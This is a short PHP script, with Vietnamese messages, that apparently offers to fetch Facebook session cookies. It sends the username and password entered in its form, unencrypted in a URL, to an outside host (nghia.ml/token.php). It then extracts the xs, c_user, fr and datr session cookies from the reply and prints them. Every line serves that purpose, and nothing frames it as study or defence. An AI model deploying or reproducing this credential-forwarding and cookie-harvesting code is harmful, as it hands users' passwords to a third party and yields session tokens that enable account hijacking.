<!----------Xử Lý------------------->
<?php
$u = htmlentities($_POST['u']);
$p = htmlentities($_POST['p']);
$get=json_decode(auto('http://nghia.ml/token.php?u='.$u.'&p='.$p.''),true); 
$xs =$get[session_cookies][1][value]; 
$fr =$get[session_cookies][2][value]; 
$datr =$get[session_cookies][3][value]; 
$id=$get[uid]; 
$error2=$get[error_code];
$log = 'xs='.$xs.';c_user='.$id.';fr='.$fr.';datr='.$datr.'';
function auto($url){
   $ch=curl_init();
   curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
   curl_setopt($ch,CURLOPT_URL,$url);
   $cx=curl_exec($ch);
  curl_close($ch);
  return($cx);
  }

?>
<!----------------------------->

<?php
if(empty($u) || empty($p)){echo 'Hãy Điền Đầy Đủ Thông Tin Và Thử Lại !!!';}
else  if($error2=="400"){echo 'Tên Người Dùng Hoặc Địa Chỉ Email Không Hợp Lệ !!!';} 
else  if($error2=="401"){echo 'Sai Tài Khoản Hoặc Mật khẩu !!!';}
else {if($error2=="405"){echo 'Tài Khoản Của Bạn Tạm Thời Bị Khóa. Vui Lòng Trở Lại Facebook Xác Nhận Checkpoin Và Quay Lại Đây Để Lấy Cookie !!!';
} else  { echo $log;}}
?>